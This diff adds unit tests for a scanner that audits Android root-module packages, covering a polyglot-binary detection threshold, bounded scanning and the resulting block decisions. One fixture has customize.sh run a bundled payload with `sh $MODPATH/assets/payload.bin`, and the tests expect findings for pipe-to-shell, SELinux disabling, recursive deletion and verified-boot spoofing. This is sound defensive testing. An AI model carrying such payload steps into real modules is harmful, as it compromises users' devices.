+  // 进面这件事可观测（工单 §3 B1：覆盖度/结构清单那一格）
+  assert.deepEqual(t4fed(r), [T4_NAME.descDnd, T4_NAME.descMusic].sort());
+  assert.deepEqual(t4fedRow(r, T4_NAME.descDnd), {
+    name: T4_NAME.descDnd, kind: 'NUL', bytes: 1416, printable: 0.875, scanBytes: 1416, scanCapped: false,
+  }, '记账要能自证读的是哪一条、多大、比例多少、实扫多少');
+  const md = renderMarkdown(r);
+  assert.match(md, /魔数\/NUL 开头但整块可读/);
+  assert.ok(md.includes(`| 二进制（已按内容规则逐行扫过） | \`${T4_NAME.descDnd}\``), '清单那一格要换措辞，不许继续说「不逐行扫」');
+  // 代价：0 条发现、0 个翻转（工单 §0 那句「阈值不是空样本，但放进来也不出声」）
+  assert.deepEqual(t4all(r), [
+    `STRUCT_BINARY/medium@${T4_NAME.descDnd}:0`,
+    `STRUCT_BINARY/medium@${T4_NAME.descMusic}:0`,
+  ], '改前实测就是这两条；改后一条都不许多');
+  assert.deepEqual(r.counts, { high: 0, medium: 2, low: 0, info: 0 });
+  assert.equal(r.riskLevel, 'medium', '等级一字不变（改前 medium）');
+  assert.equal(r.decision.action, 'block', '结论一字不变（改前 block）');
+});
+
+test('T4-B2 反面（工单 §3 B2）：真机器码（比例 0.3403）不许进 feed，报告清单与改前逐字一致', async () => {
+  const b = t4real('fontSlice');
+  assert.equal(b.length, 3000);
+  assert.equal(t4ratio(b).toFixed(6), '0.340333', '真机器码离 0.85 有半个身的余量（工单 §0 的反面锚）');
+  assert.equal(detectBinary(b.subarray(0, 512)).id, 'NUL');
+  const r = await t4pkg('eval.t4b2', T4_NAME.fontSlice, b);
+  assert.deepEqual(t4fed(r), [], '阈值把机器码关在面外：这一格就是变异 M2（阈值改 0.3）红第一名的地方');
+  assert.deepEqual(t4all(r), [`STRUCT_BINARY/medium@${T4_NAME.fontSlice}:0`], 'findings 与改前逐字一致');
+  assert.deepEqual(r.binaries, [{ name: T4_NAME.fontSlice, kind: 'NUL', bytes: 3000 }]);
+  assert.deepEqual(r.scripts.map((x) => x.name), ['service.sh', 'module.prop'], '渲染面不许多出一行');
+  assert.deepEqual(r.inventory.otherFiles, []);
+  assert.deepEqual(r.escalated, []);
+  assert.deepEqual(r.counts, { high: 0, medium: 1, low: 0, info: 0 });
+  assert.equal(r.riskLevel, 'medium');
+  assert.equal(renderMarkdown(r).includes('| 二进制（不逐行扫） |'), true, '没进面的条目继续用原来那一行措辞');
+});
+
+test('T4-B3 撤销（工单 §2.5 / §3 B3）：polyglot 进 feed 之后，`sh $MODPATH/assets/payload.bin` 仍然撤不掉', async () => {
+  // 载荷 + customize.sh 里那句引用。改前它就是**因引用被升级**进面的（Task 2.7 那条通道），
+  // EXEC_BUNDLED_FILE/high 在、revokedBundledRefs=[]、high/block。本轮之后必须**一字不变**：
+  // 「它现在在 feed 里」不等于「读过且无罪」（§0.13 那一格不许重开）。
+  const zip = makeModuleZip({ id: 'eval.t4b3', files: [
+    ['customize.sh', '#!/system/bin/sh\nsh $MODPATH/assets/payload.bin\n'],
+    ['assets/payload.bin', T4_SHAPE.a1],
+  ]});
+  const r = await scanToReport(zip, { changeType: 'first' });
+  assert.deepEqual(t4all(r), [
+    'EXEC_BUNDLED_FILE/high@customize.sh:2',
+    'NETWORK_FETCH/low@assets/payload.bin:2',
+    'PIPE_TO_SHELL/high@assets/payload.bin:2',
+    'RM_RF_MUTABLE/medium@assets/payload.bin:3',
+    'SELINUX_DISABLE/high@assets/payload.bin:4',
+    'STRUCT_BINARY/medium@assets/payload.bin:0',
+    'VERIFIED_BOOT_SPOOF/high@assets/payload.bin:5',
+  ], '撤销语义不许被这一步带歪：证人那条必须在、必须还是 high');
+  assert.deepEqual(r.revokedBundledRefs, [], '一笔撤销都没发生 —— 有撤销就说明 covered 判据被喂进 feed 的条目污染了（变异 M3 红在这里）');
+  assert.deepEqual(r.escalated, [
+    { fromFile: 'customize.sh', fromLine: 2, ref: 'sh $MODPATH/assets/payload.bin', resolvedEntry: 'assets/payload.bin' },
+  ], '它本来就是靠引用升级进面的；本轮的新通道不许把它记第二遍，也不许顶掉这笔账');
+  assert.deepEqual(r.counts, { high: 4, medium: 2, low: 1, info: 0 });
+  assert.equal(r.riskLevel, 'high');
+  assert.equal(r.decision.action, 'block');
+  assert.equal(r.decision.needsHumanReview, true);
+  assert.deepEqual(t4fed(r), [], '已在 feed 上的条目不重复记账：polyglot 那一步只补「原本一行都没读」的那几份');
+});
+
+// —— §3 不变量 ——
+
+test('T4-C1 不变量（工单 §2.2）：可打印比例全仓只有一份实现，阈值是具名单一常量', () => {
+  const shared = readFileSync(new URL('./risk-rules.mjs', import.meta.url), 'utf8');
+  const scanSrc = readFileSync(new URL('./scan.mjs', import.meta.url), 'utf8');
+  assert.equal((shared.match(/export function printableRatio/g) || []).length, 1, '比例函数只许在共享层导出一次');
+  assert.equal((shared.match(/export const POLYGLOT_MIN_PRINTABLE/g) || []).length, 1, '阈值必须是具名单一常量');
+  assert.equal(sharedT4.POLYGLOT_MIN_PRINTABLE, 0.85, '阈值就是工单 §0 那一个数');
+  assert.equal(typeof sharedT4.printableRatio, 'function', '共享层要拿得出这个函数');
+  // 只许有一份实现：scan.mjs 里不许再写第二份字符类，也不许自己导出一个同名函数
+  assert.equal(scanSrc.includes('function printableRatio'), false, 'scan.mjs 不许另立一份实现');
+  assert.equal(/0x20\s*&&[^;\n]*0x7[eE]/.test(scanSrc), false, 'scan.mjs 里不许出现第二份可打印字符类');
+  assert.equal(/0x09[^;\n]*0x0[aA]9?/.test(scanSrc), false, '制表/换行那一截也不许抄第二份');
+  assert.equal(scanT4.printableRatio, undefined, '比例函数只在 risk-rules.mjs 导出一次');
+  assert.match(scanSrc, /import\s*{[^}]*printableRatio[^}]*}\s*from\s*'\.\/risk-rules\.mjs'/, 'scan.mjs 必须从共享层拿它');
+  // 量法逐字对账（夹具侧那份独立复算只用来验这一句）
+  for (const key of ['a1', 'a2', 'in851', 'eq850', 'out849', 'big']) {
+    assert.equal(sharedT4.printableRatio(T4_SHAPE[key]), t4ratio(T4_SHAPE[key]), `${key} 的两种量法必须同值`);
+  }
+  assert.equal(sharedT4.printableRatio(Buffer.alloc(0)), 0, '空条目比例记 0（工单 §2.1「内容非空」那一半另有判据）');
+});
+
+test('T4-C2 不变量（工单 §2.1）：分桶契约一字未动 —— 没有新桶、coveredSurface 仍是那五个桶', () => {
+  const files = readZip(makeModuleZip({ id: 'eval.t4c2', files: [
+    ['service.sh', T4_CLEAN_SERVICE], ['assets/payload.bin', T4_SHAPE.a1],
+  ]})).files;
+  const c = classify(files);
+  assert.deepEqual(Object.keys(c).filter((k) => k !== 'propEntry').sort(),
+    [...SCAN_TARGET_BUCKETS, 'binaries', 'others'].sort(),
+    '本轮不许给 classify() 新增返回键（工单 §2 末条：那是分桶契约，越界即停手）');
+  assert.deepEqual(c.binaries.map((f) => f.name), ['assets/payload.bin'], '它仍然落 binaries 桶 —— 进的是 feed，不是文本桶');
+  assert.deepEqual(c.otherScripts, []);
+  assert.deepEqual(SCAN_TARGET_BUCKETS, ['canonical', 'otherScripts', 'handlers', 'props', 'policy'],
+    '可撤销面仍是扩面之前那五个桶，一个都没多');
+});
+
+test('T4-C3 不变量（工单 §2.3）：polyglot 走的仍是 24 KB 有界通道，超限照旧记 AUDIT_COVERAGE_TRUNCATED', async () => {
+  assert.ok(T4_SHAPE.big.length > CAP29, `夹具必须超上限（${T4_SHAPE.big.length} / ${CAP29}）`);
+  assert.equal(T4_SHA1(T4_SHAPE.big), T4_SHA.big, '夹具字节面钉住');
+  assert.equal(t4ratio(T4_SHAPE.big).toFixed(6), '0.997474');
+  const r = await t4pkg('eval.t4c3', 'assets/big.bin', T4_SHAPE.big);
+  assert.ok(!r.findings.some((f) => f.ruleId === 'SELINUX_DISABLE'),
+    '上限之后的载荷一行都不许多读（绕过有界通道直接喂全文 = 变异 M4，红在这一格）');
+  const cov = r.findings.filter((f) => f.ruleId === 'AUDIT_COVERAGE_TRUNCATED');
+  assert.equal(cov.length, 1, JSON.stringify(cov));
+  assert.equal(cov[0].file, 'assets/big.bin');
+  assert.equal(cov[0].severity, 'medium');
+  assert.match(cov[0].message, new RegExp(String(T4_SHAPE.big.length)), '要写原文多少字节');
+  assert.match(cov[0].message, new RegExp(String(CAP29)), '要写实扫多少字节');
+  assert.deepEqual(t4fed(r), ['assets/big.bin']);
+  assert.equal(t4fedRow(r, 'assets/big.bin').scanBytes, CAP29, '记账里的实扫字节必须正好砍在上限上');
+  assert.equal(t4fedRow(r, 'assets/big.bin').scanCapped, true);
+  assert.notEqual(r.decision.action, 'auto-approve', '「读到一半」永远不等于「干净」');
+});
+
+test('T4-C4 不变量（工单 §2.4）：一份身份 —— 条目只在 binaries 清单里出现一次，且纯函数、去重键不变', async () => {
+  const r = await t4pkg('eval.t4c4', 'assets/payload.bin', T4_SHAPE.a1);
+  assert.equal(r.binaries.filter((b) => b.name === 'assets/payload.bin').length, 1, 'binaries 清单里就一份');
+  assert.deepEqual(r.binaries, [{ name: 'assets/payload.bin', kind: 'ELF', bytes: T4_SHAPE.a1.length }],
+    'kind / bytes 那份登记一字未动（checkBinaries 没被本轮碰歪）');
+  assert.equal(t4listAppearances(r, 'assets/payload.bin'), 0,
+    '不许再出现在 otherFiles / scripts / 任何一个文本清单里（工单 §2.4）');
+  const keys = r.findings.map((f) => `${f.ruleId}@${f.file}:${f.line}`);
+  assert.equal(new Set(keys).size, keys.length, '同一去重键不许出现两次（counts 口径不变）');
+  // 纯函数：同输入两次同结果（内容、记账、等级都不许带状态）
+  const r2 = await t4pkg('eval.t4c4', 'assets/payload.bin', T4_SHAPE.a1);
+  assert.deepEqual(t4all(r2), t4all(r));
+  assert.deepEqual(r2.polyglotFed, r.polyglotFed);
+  assert.deepEqual(r2.counts, r.counts);
+  assert.equal(r2.riskLevel, r.riskLevel);
+});
